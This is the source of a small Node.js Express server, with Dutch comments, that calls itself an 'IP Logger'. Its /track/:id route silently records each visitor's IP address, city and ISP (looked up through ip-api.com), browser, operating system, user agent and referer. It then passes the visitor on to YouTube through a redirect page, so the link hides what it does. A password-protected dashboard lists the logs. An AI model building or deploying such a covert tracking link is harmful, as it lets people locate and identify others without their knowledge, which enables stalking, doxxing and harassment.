const express = require('express');
const dotenv = require('dotenv');
const uaParser = require('ua-parser-js');
const basicAuth = require('express-basic-auth');
const fs = require('fs');

dotenv.config();

const app = express();
app.use(express.static('public'));
app.use(express.json());

const auth = basicAuth({
  users: { [process.env.ADMIN_USER]: process.env.ADMIN_PASS },
  challenge: true
});

// === ROOT ===
app.get('/', (req, res) => {
  res.send('<h1>IP Logger Online</h1><p><a href="/admin">Ga naar Dashboard</a></p>');
});

// === TRACKER ===
app.get('/track/:id', async (req, res) => {
  const trackerId = req.params.id;
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const referer = req.headers.referer || 'Direct';

  let destinationUrl = "https://youtube.com";

  try {
    const parser = uaParser(userAgent);

    let geo = {};
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,lat,lon,isp,org`);
      geo = await geoRes.json();
    } catch (e) {}

    const log = {
      timestamp: new Date().toISOString(),
      tracker_id: trackerId,
      ip: ip,
      country: geo.country || 'Unknown',
      city: geo.city || 'Unknown',
      isp: geo.isp || 'Unknown',
      browser: parser.browser.name || 'Unknown',
      os: parser.os.name || 'Unknown',
      device: parser.device.type || 'desktop',
      useragent: userAgent,
      referer: referer
    };

    // Opslaan in logs.txt
    fs.appendFileSync('logs.txt', JSON.stringify(log) + '\n');

    console.log(`✅ Gelogd → ${trackerId} | IP: ${ip}`);

  } catch (error) {
    console.error("Error:", error);
  }

  // Redirect
  let html = fs.readFileSync(__dirname + '/views/redirect.html', 'utf8');
  html = html.replace("{{DESTINATION_URL}}", destinationUrl);
  res.send(html);
});

// === ADMIN ===
app.get('/admin', auth, (req, res) => {
  res.sendFile(__dirname + '/views/admin.html');
});

app.get('/api/logs', auth, (req, res) => {
  if (fs.existsSync('logs.txt')) {
    const data = fs.readFileSync('logs.txt', 'utf8');
    const logs = data.trim().split('\n').filter(line => line).map(line => JSON.parse(line));
    logs.reverse();
    res.json(logs);
  } else {
    res.json([]);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ IP Logger draait op poort ${PORT}`);
});